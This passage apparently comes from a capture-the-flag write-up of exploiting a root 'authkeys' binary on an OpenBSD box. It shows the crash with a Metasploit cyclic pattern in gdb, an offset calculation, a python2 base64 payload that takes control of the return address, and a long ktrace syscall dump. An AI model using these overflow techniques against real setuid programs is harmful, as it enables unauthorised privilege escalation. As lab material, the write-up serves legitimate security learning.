foo# ./authkeys SHA256:bCYhcLxewQOJWyrjVlQYM4FoWjt+5iQ3yY0UvtxZCio /root ssh-rsa QWEwQWExQWEyQWEzQWE0QWE1QWE2QWE3QWE4QWE5QWIwQWIxQWIyQWIzQWI0QWI1QWI2QWI3QWI4QWI5QWMwQWMxQWMyQWMzQWM0QWM1QWM2QWM3QWM4QWM5QWQwQWQxQWQyQWQzQWQ0QWQ1QWQ2QWQ3QWQ4QWQ5QWUwQWUxQWUyQWUzQWU0QWU1QWU2QWU3QWU4QWU5QWYwQWYxQWYyQWYzQWY0QWY1QWY2QWY3QWY4QWY5QWcwQWcxQWcyQWczQWc0QWc1QWc2QWc3QWc4QWc5QWgwQWgxQWgyQWgzQWg0QWg1QWg2QWg3QWg4QWg5QWkwQWkxQWkyQWkzQWk0QWk1QWk2QWk3QWk4QWk5QWowQWoxQWoyQWozQWo0QWo1QWo2QWo3QWo4QWo5QWswQWsxQWsyQWszQWs0QWs1QWs2QWs3QWs4QWs5QWwwQWwxQWwyQWwzQW4zQW40QW41QW42QW43QW44QW45QW8wQW8xQW8yQW8zQW80QW81QW82QW83QW84QW85QXAwQXAxQXAyQXAzQXA0QXA1QXA2QXA3QXA4QXA5QXEwQXExQXEyQXEzQXE0QXE1QXE2QXE3QXE4QXE5QXIwQXIxQXIyQXIzQXI0QXI1QXI2QXI3QXI4QXI5QXMwQXMxQXMyQXMzQXM0QXM1QXM2QXM3QXM4QXM5QXQwQXQxQXQyQXQzQXQ0QXQ1QXQ2QXQ3QXQ4QXQ5QXUwQXUxQXUyQXUzQXU0QXU1QXU2QXU3QXU4QXU5QXYwQXYxQXYyQXYzQXY0QXY1QXY2QXY3QXY4QXY5QXcwQXcxQXcyQXczQXc0QXc1QXc2QXc3QXc4QXc5QXgwQXgxQXgyQXgzQXg0QXg1QXg2QXg3QXg4QXg5QXkwQXkxQXkyQXkzQXk0QXk1QXk2QXk3QXk4QXk5QXowQXoxQXoyQXozQXo0QXo1QXo2QXo3QXo4QXo5QmEwQmExQmEyQmEzQmE0QmE1QmE2QmE3QmE4QmE5QmIwQmIxQmIyQmIzQmI0QmI1QmI2QmI3QmI4QmI5QmMwQmMxQmMyQmMzQmM0QmU0QmU1QmU2QmU3QmU4QmU5QmYwQmYxQmYyQmYzQmY0QmY1QmY2QmY3QmY4QmY5QmcwQmcxQmcyQmczQmc0Qmc1Qmc2Qmc3Qmc4Qmc5QmgwQmgxQmgyQmgzQmg0Qmg1Qmg2Qmg3Qmg4Qmg5QmkwQgo=
Evaluating key...
Bus error (core dumped)
```

AHA, we triggerd some kind of evil at least. Core was dumped. We need to explore this further in gdb.

### Use GDB to further narrow down possible exploit

Let´s kick off with gdb and give it the same argument to see if we can analyze that error further.

```gdb
(gdb) r $(echo SHA256:bCYhcLxewQOJWyrjVlQYM4FoWjt+5iQ3yY0UvtxZCio /root ssh-rsa QWEwQWExQWEyQWEzQWE0QWE1QWE2QWE3QWE4QWE5QWIwQWIxQWIyQWIzQWI0QWI1QWI2QWI3QWI4QWI5QWMwQWMxQWMyQWMzQWM0QWM1QWM2QWM3QWM4QWM5QWQwQWQxQWQyQWQzQWQ0QWQ1QWQ2QWQ3QWQ4QWQ5QWUwQWUxQWUyQWUzQWU0QWU1QWU2QWU3QWU4QWU5QWYwQWYxQWYyQWYzQWY0QWY1QWY2QWY3QWY4QWY5QWcwQWcxQWcyQWczQWc0QWc1QWc2QWc3QWc4QWc5QWgwQWgxQWgyQWgzQWg0QWg1QWg2QWg3QWg4QWg5QWkwQWkxQWkyQWkzQWk0QWk1QWk2QWk3QWk4QWk5QWowQWoxQWoyQWozQWo0QWo1QWo2QWo3QWo4QWo5QWswQWsxQWsyQWszQWs0QWs1QWs2QWs3QWs4QWs5QWwwQWwxQWwyQWwzQW4zQW40QW41QW42QW43QW44QW45QW8wQW8xQW8yQW8zQW80QW81QW82QW83QW84QW85QXAwQXAxQXAyQXAzQXA0QXA1QXA2QXA3QXA4QXA5QXEwQXExQXEyQXEzQXE0QXE1QXE2QXE3QXE4QXE5QXIwQXIxQXIyQXIzQXI0QXI1QXI2QXI3QXI4QXI5QXMwQXMxQXMyQXMzQXM0QXM1QXM2QXM3QXM4QXM5QXQwQXQxQXQyQXQzQXQ0QXQ1QXQ2QXQ3QXQ4QXQ5QXUwQXUxQXUyQXUzQXU0QXU1QXU2QXU3QXU4QXU5QXYwQXYxQXYyQXYzQXY0QXY1QXY2QXY3QXY4QXY5QXcwQXcxQXcyQXczQXc0QXc1QXc2QXc3QXc4QXc5QXgwQXgxQXgyQXgzQXg0QXg1QXg2QXg3QXg4QXg5QXkwQXkxQXkyQXkzQXk0QXk1QXk2QXk3QXk4QXk5QXowQXoxQXoyQXozQXo0QXo1QXo2QXo3QXo4QXo5QmEwQmExQmEyQmEzQmE0QmE1QmE2QmE3QmE4QmE5QmIwQmIxQmIyQmIzQmI0QmI1QmI2QmI3QmI4QmI5QmMwQmMxQmMyQmMzQmM0QmU0QmU1QmU2QmU3QmU4QmU5QmYwQmYxQmYyQmYzQmY0QmY1QmY2QmY3QmY4QmY5QmcwQmcxQmcyQmczQmc0Qmc1Qmc2Qmc3Qmc4Qmc5QmgwQmgxQmgyQmgzQmg0Qmg1Qmg2Qmg3Qmg4Qmg5QmkwQgo=)
Starting program: /root/authkeys $(echo SHA256:bCYhcLxewQOJWyrjVlQYM4FoWjt+5iQ3yY0UvtxZCio /root ssh-rsa QWEwQWExQWEyQWEzQWE0QWE1QWE2QWE3QWE4QWE5QWIwQWIxQWIyQWIzQWI0QWI1QWI2QWI3QWI4QWI5QWMwQWMxQWMyQWMzQWM0QWM1QWM2QWM3QWM4QWM5QWQwQWQxQWQyQWQzQWQ0QWQ1QWQ2QWQ3QWQ4QWQ5QWUwQWUxQWUyQWUzQWU0QWU1QWU2QWU3QWU4QWU5QWYwQWYxQWYyQWYzQWY0QWY1QWY2QWY3QWY4QWY5QWcwQWcxQWcyQWczQWc0QWc1QWc2QWc3QWc4QWc5QWgwQWgxQWgyQWgzQWg0QWg1QWg2QWg3QWg4QWg5QWkwQWkxQWkyQWkzQWk0QWk1QWk2QWk3QWk4QWk5QWowQWoxQWoyQWozQWo0QWo1QWo2QWo3QWo4QWo5QWswQWsxQWsyQWszQWs0QWs1QWs2QWs3QWs4QWs5QWwwQWwxQWwyQWwzQW4zQW40QW41QW42QW43QW44QW45QW8wQW8xQW8yQW8zQW80QW81QW82QW83QW84QW85QXAwQXAxQXAyQXAzQXA0QXA1QXA2QXA3QXA4QXA5QXEwQXExQXEyQXEzQXE0QXE1QXE2QXE3QXE4QXE5QXIwQXIxQXIyQXIzQXI0QXI1QXI2QXI3QXI4QXI5QXMwQXMxQXMyQXMzQXM0QXM1QXM2QXM3QXM4QXM5QXQwQXQxQXQyQXQzQXQ0QXQ1QXQ2QXQ3QXQ4QXQ5QXUwQXUxQXUyQXUzQXU0QXU1QXU2QXU3QXU4QXU5QXYwQXYxQXYyQXYzQXY0QXY1QXY2QXY3QXY4QXY5QXcwQXcxQXcyQXczQXc0QXc1QXc2QXc3QXc4QXc5QXgwQXgxQXgyQXgzQXg0QXg1QXg2QXg3QXg4QXg5QXkwQXkxQXkyQXkzQXk0QXk1QXk2QXk3QXk4QXk5QXowQXoxQXoyQXozQXo0QXo1QXo2QXo3QXo4QXo5QmEwQmExQmEyQmEzQmE0QmE1QmE2QmE3QmE4QmE5QmIwQmIxQmIyQmIzQmI0QmI1QmI2QmI3QmI4QmI5QmMwQmMxQmMyQmMzQmM0QmU0QmU1QmU2QmU3QmU4QmU5QmYwQmYxQmYyQmYzQmY0QmY1QmY2QmY3QmY4QmY5QmcwQmcxQmcyQmczQmc0Qmc1Qmc2Qmc3Qmc4Qmc5QmgwQmgxQmgyQmgzQmg0Qmg1Qmg2Qmg3Qmg4Qmg5QmkwQgo=)
warning: shared library handler failed to enable breakpoint
Evaluating key...

Program received signal SIGBUS, Bus error.
0x000000000040036b in ?? ()
(gdb) x/s $rsp
0x7f7ffffc6d00:	 "Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B\n"
(gdb) x/2x $rsp
0x7f7ffffc6d08: 0x4239624238624237      0x3263423163423063

```

Hell yes that looks very much like our metasploit pattern payload on the stack. We can take the hex representation 0x3263423163423063 and try to calculate the offset.

```shell
┌──(root💀c974b36640ee)-[/]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x3263423163423063
[*] Exact match at offset 841
```

We have match of offset 841. Great let´s produce a new payload where we try to put 0x0000000000000000 at the exact point where a ret instruction fetches next address from the stack. We need to adjust 841 by 8 bytes since the $rsp had been incremented when we fot our error and 841 - 8 equals 776. Ehhh, what??? Well, this is where helle broke loose. I have no idea what kind of black magic the creators of this box used but the payload kept jumping back and forth on the stack and sometimes it just broke into complete mayhem. So for now let´s just asume that if we use a repetitive pattern of the character 'A' the offset will be 776 things will change as we add stuff and this caused me multiple headaces for several days.

```gdb
(gdb) r $(python2 -c 'import base64; print("SHA256:bCYhcLxewQOJWyrjVlQYM4FoWjt+5iQ3yY0UvtxZCio " + " /root "  + "ssh-rsa " + base64.b64encode(("A"*776)+"\x00"*64))')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /root/authkeys $(python2 -c 'import base64; print("SHA256:bCYhcLxewQOJWyrjVlQYM4FoWjt+5iQ3yY0UvtxZCio " + " /root "  + "ssh-rsa " + base64.b64encode(("A"*776)+"\x00"*64))')
warning: shared library handler failed to enable breakpoint
Evaluating key...

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
(gdb) x/2x $rsp-16
0x7f7ffffcb6d0:	0x41414141	0x41414141
```

YES, wi hit it the spot, like a glove and so on ;) At this time I was starting to wonder if it really was possible that we could put code on the stack and call it. ASLR was abviously active cause tha stack address keep changing. I was having a dialog with a guy at the forum who was at kind of the same spot as me, He said that he put code on the stack but it wouldn´t execute. A simple check with ktrace shows:

```shell
foo# ktrace -t c authkeys   
Too bad, Wrong number of arguments!
foo# kdump -f authkeys.log  
   613 ktrace   RET   ktrace 0
   613 ktrace   CALL  execve(0x7f7ffffde8d0,0x7f7ffffdeef8,0x7f7ffffdef30)
   613 ktrace   RET   execve -1 errno 2 No such file or directory
   613 ktrace   CALL  execve(0x7f7ffffde8d0,0x7f7ffffdeef8,0x7f7ffffdef30)
   613 ktrace   RET   execve -1 errno 2 No such file or directory
   613 ktrace   CALL  execve(0x7f7ffffde8d0,0x7f7ffffdeef8,0x7f7ffffdef30)
   613 ktrace   RET   execve -1 errno 2 No such file or directory
   613 ktrace   CALL  execve(0x7f7ffffde8d0,0x7f7ffffdeef8,0x7f7ffffdef30)
   613 w        RET   execve 0
   613 w        CALL  getentropy(0x7f7ffffd2970,40)
   613 w        RET   getentropy 0
   613 w        CALL  getentropy(0x7f7ffffd2970,40)
   613 w        RET   getentropy 0
   613 w        CALL  mmap(0,0x4000,0<PROT_NONE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 18999612608512/0x1147b1291000
   613 w        CALL  mprotect(0x1147b1292000,0x2000,0x3<PROT_READ|PROT_WRITE>)
   613 w        RET   mprotect 0
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 18999646109696/0x1147b3284000
   613 w        CALL  issetugid()
   613 w        RET   issetugid 0
   613 w        CALL  mprotect(0x114819a95000,0x1000,0x1<PROT_READ>)
   613 w        RET   mprotect 0
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 18999194238976/0x114798394000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 18998298099712/0x114762cf4000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 18999992430592/0x1147c7ccb000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19001421340672/0x11481cf82000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19000489783296/0x1147e571b000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19001132515328/0x11480bc10000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19000115335168/0x1147cf201000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 18998368669696/0x114767041000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19000202817536/0x1147d456f000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19001259081728/0x1148134c4000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 18999865819136/0x1147c040c000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19000216018944/0x1147d5206000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19001953755136/0x11483cb42000
   613 w        CALL  open(0x114819a83832,0x10000<O_RDONLY|O_CLOEXEC>)
   613 w        RET   open 3
   613 w        CALL  fstat(3,0x7f7ffffd27d0)
   613 w        RET   fstat 0
   613 w        CALL  mmap(0,0x39b9,0x1<PROT_READ>,0x2<MAP_PRIVATE>,3,0)
   613 w        RET   mmap 19001961947136/0x11483d312000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 18999706529792/0x1147b6c23000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 18999166267392/0x1147968e7000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19000223531008/0x1147d5930000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 18999486017536/0x1147a99d7000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 18999111921664/0x114793513000
   613 w        CALL  close(3)
   613 w        RET   close 0
   613 w        CALL  open(0x11483d3155c8,0x10000<O_RDONLY|O_CLOEXEC>)
   613 w        RET   open 3
   613 w        CALL  fstat(3,0x7f7ffffd28a8)
   613 w        RET   fstat 0
   613 w        CALL  read(3,0x7f7ffffd18a0,0x1000)
   613 w        RET   read 4096/0x1000
   613 w        CALL  mmap(0,0xf5000,0<PROT_NONE>,0x2<MAP_PRIVATE>,3,0)
   613 w        RET   mmap 19000064929792/0x1147cc1ef000
   613 w        CALL  mmap(0x1147cc1ef000,0x37000,0x1<PROT_READ>,0x12<MAP_PRIVATE|MAP_FIXED>,3,0)
   613 w        RET   mmap 19000064929792/0x1147cc1ef000
   613 w        CALL  mmap(0x1147cc226000,0xa6000,0x5<PROT_READ|PROT_EXEC>,0x12<MAP_PRIVATE|MAP_FIXED>,3,0x37000)
   613 w        RET   mmap 19000065155072/0x1147cc226000
   613 w        CALL  mmap(0x1147cc2cc000,0x8000,0x3<PROT_READ|PROT_WRITE>,0x12<MAP_PRIVATE|MAP_FIXED>,3,0xdd000)
   613 w        RET   mmap 19000065835008/0x1147cc2cc000
   613 w        CALL  mmap(0x1147cc2d4000,0x10000,0x3<PROT_READ|PROT_WRITE>,0x1012<MAP_PRIVATE|MAP_FIXED|MAP_ANON>,-1,0)
   613 w        RET   mmap 19000065867776/0x1147cc2d4000
   613 w        CALL  close(3)
   613 w        RET   close 0
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19002171916288/0x114849b50000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19000460914688/0x1147e3b93000
   613 w        CALL  open(0x11483d314537,0x10000<O_RDONLY|O_CLOEXEC>)
   613 w        RET   open 3
   613 w        CALL  fstat(3,0x7f7ffffd28a8)
   613 w        RET   fstat 0
   613 w        CALL  read(3,0x7f7ffffd18a0,0x1000)
   613 w        RET   read 4096/0x1000
   613 w        CALL  mmap(0,0xd000,0<PROT_NONE>,0x2<MAP_PRIVATE>,3,0)
   613 w        RET   mmap 19000865865728/0x1147fbdc4000
   613 w        CALL  mmap(0x1147fbdc4000,0x3000,0x1<PROT_READ>,0x12<MAP_PRIVATE|MAP_FIXED>,3,0)
   613 w        RET   mmap 19000865865728/0x1147fbdc4000
   613 w        CALL  mmap(0x1147fbdc7000,0x7000,0x5<PROT_READ|PROT_EXEC>,0x12<MAP_PRIVATE|MAP_FIXED>,3,0x3000)
   613 w        RET   mmap 19000865878016/0x1147fbdc7000
   613 w        CALL  mmap(0x1147fbdce000,0x2000,0x3<PROT_READ|PROT_WRITE>,0x12<MAP_PRIVATE|MAP_FIXED>,3,0xa000)
   613 w        RET   mmap 19000865906688/0x1147fbdce000
   613 w        CALL  mmap(0x1147fbdd0000,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1012<MAP_PRIVATE|MAP_FIXED|MAP_ANON>,-1,0)
   613 w        RET   mmap 19000865914880/0x1147fbdd0000
   613 w        CALL  close(3)
   613 w        RET   close 0
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19000045191168/0x1147caf1c000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19000315883520/0x1147db143000
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19001659858944/0x11482b2fa000
   613 w        CALL  mmap(0,0xa000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 18999560404992/0x1147ae0c8000
   613 w        CALL  mprotect(0x1147cc2ce000,0x6000,0x1<PROT_READ>)
   613 w        RET   mprotect 0
   613 w        CALL  munmap(0x1147ae0c8000,0xa000)
   613 w        RET   munmap 0
   613 w        CALL  mprotect(0x1147fbdcf000,0x1000,0x1<PROT_READ>)
   613 w        RET   mprotect 0
   613 w        CALL  mprotect(0x11455b105000,0x388,0x1<PROT_READ>)
   613 w        RET   mprotect 0
   613 w        CALL  getthrid()
   613 w        RET   getthrid 264235/0x4082b
   613 w        CALL  __set_tcb(0x11481cf82700)
   613 w        RET   __set_tcb 0
   613 w        CALL  kbind(0x7f7ffffd2ad0,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19000022102016/0x1147c9917000
   613 w        CALL  mprotect(0x1147c9917000,0x1000,0x1<PROT_READ>)
   613 w        RET   mprotect 0
   613 w        CALL  kbind(0x7f7ffffd2ac0,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  mprotect(0x1147c9917000,0x1000,0x3<PROT_READ|PROT_WRITE>)
   613 w        RET   mprotect 0
   613 w        CALL  mprotect(0x1147c9917000,0x1000,0x1<PROT_READ>)
   613 w        RET   mprotect 0
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  pledge(0x11455b1011d7,0)
   613 w        RET   pledge 0
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  kbind(0x7f7ffffd2120,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  sysctl(2.12<vm.malloc_conf>,0x7f7ffffd2140,0x7f7ffffd2158,0,0)
   613 w        RET   sysctl 0
   613 w        CALL  issetugid()
   613 w        RET   issetugid 0
   613 w        CALL  getentropy(0x7f7ffffd20e0,40)
   613 w        RET   getentropy 0
   613 w        CALL  mmap(0,0x450,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19001465479168/0x11481f99a000
   613 w        CALL  minherit(0x11481f99a000,0x450,MAP_INHERIT_ZERO)
   613 w        RET   minherit 0
   613 w        CALL  kbind(0x7f7ffffd2010,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  mprotect(0x1147cc2d5000,0x1000,0x3<PROT_READ|PROT_WRITE>)
   613 w        RET   mprotect 0
   613 w        CALL  mmap(0,0x4000,0<PROT_NONE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19000642662400/0x1147ee8e7000
   613 w        CALL  mprotect(0x1147ee8e8000,0x2000,0x3<PROT_READ|PROT_WRITE>)
   613 w        RET   mprotect 0
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19002369585152/0x1148557d3000
   613 w        CALL  mprotect(0x1147cc2d5000,0x1000,0x1<PROT_READ>)
   613 w        RET   mprotect 0
   613 w        CALL  mmap(0,0x1000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19002408472576/0x114857ce9000
   613 w        CALL  kbind(0x7f7ffffd0c50,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  gettimeofday(0x7f7ffffd2200,0)
   613 w        RET   gettimeofday 0
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  mprotect(0x1147c9917000,0x1000,0x3<PROT_READ|PROT_WRITE>)
   613 w        RET   mprotect 0
   613 w        CALL  mprotect(0x1147c9917000,0x1000,0x1<PROT_READ>)
   613 w        RET   mprotect 0
   613 w        CALL  open(0x11455b10127f,0<O_RDONLY>)
   613 w        RET   open 3
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  fstat(3,0x7f7ffffd20e0)
   613 w        RET   fstat 0
   613 w        CALL  kbind(0x7f7ffffd2010,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  mmap(0,0x4000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 18998380826624/0x114767bd9000
   613 w        CALL  read(3,0x114767bd9000,0x4000)
   613 w        RET   read 6992/0x1b50
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  read(3,0x114767bd9000,0x4000)
   613 w        RET   read 0
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  close(3)
   613 w        RET   close 0
   613 w        CALL  kbind(0x7f7ffffd2130,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  kbind(0x7f7ffffd2110,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  mmap(0,0x5000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 18998736801792/0x11477cf55000
   613 w        CALL  mmap(0,0xb000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 18999051907072/0x11478fbd7000
   613 w        CALL  open(0x1147cc20dbb9,0<O_RDONLY>)
   613 w        RET   open 3
   613 w        CALL  read(3,0x11478fbd7000,0xa1e8)
   613 w        RET   read 1892/0x764
   613 w        CALL  close(3)
   613 w        RET   close 0
   613 w        CALL  mmap(0,0xb000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19000945643520/0x1148009d9000
   613 w        CALL  issetugid()
   613 w        RET   issetugid 0
   613 w        CALL  open(0x7f7ffffcd060,0<O_RDONLY>)
   613 w        RET   open 3
   613 w        CALL  read(3,0x1148009d9000,0xa1e8)
   613 w        RET   read 2819/0xb03
   613 w        CALL  close(3)
   613 w        RET   close 0
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  fstat(1,0x7f7ffffd1880)
   613 w        RET   fstat 0
   613 w        CALL  mmap(0,0x10000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,-1,0)
   613 w        RET   mmap 19000572661760/0x1147ea625000
   613 w        CALL  fcntl(1,F_ISATTY)
   613 w        RET   fcntl 1
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  clock_gettime(CLOCK_BOOTTIME,0x7f7ffffd2b30)
   613 w        RET   clock_gettime 0
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  sysctl(2.2<vm.loadavg>,0x7f7ffffd21e0,0x7f7ffffd2200,0,0)
   613 w        RET   sysctl 0
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  write(1,0x1147ea625000,0x3b)
   613 w        RET   write 59/0x3b
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  write(1,0x1147ea625000,0x30)
   613 w        RET   write 48/0x30
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  kbind(0x7f7ffffd2070,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  sysctl(1.66.0.0.616.0<kern.proc.all.0.616.0>,0,0x7f7ffffd21e8,0,0)
   613 w        RET   sysctl 0
   613 w        CALL  kbind(0x7f7ffffd2040,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  sysctl(1.66.0.0.616.41<kern.proc.all.0.616.41>,0x11478fbd7000,0x7f7ffffd21e8,0,0)
   613 w        RET   sysctl 0
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  ioctl(1,TIOCGWINSZ,0x11455b106268)
   613 w        RET   ioctl 0
   613 w        CALL  kbind(0x7f7ffffd2160,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  mprotect(0x1147c9917000,0x1000,0x3<PROT_READ|PROT_WRITE>)
   613 w        RET   mprotect 0
   613 w        CALL  mprotect(0x1147c9917000,0x1000,0x1<PROT_READ>)
   613 w        RET   mprotect 0
   613 w        CALL  mprotect(0x1147c9917000,0x1000,0x3<PROT_READ|PROT_WRITE>)
   613 w        RET   mprotect 0
   613 w        CALL  mprotect(0x1147c9917000,0x1000,0x1<PROT_READ>)
   613 w        RET   mprotect 0
   613 w        CALL  kbind(0x7f7ffffd2070,24,0x77b1f6ad4d6abadf)
   613 w        RET   kbind 0
   613 w        CALL  mprotect(0x1147c9917000,0x1000,0x3<PROT_READ|PROT_WRITE>)
   613 w        RET   mprotect 0
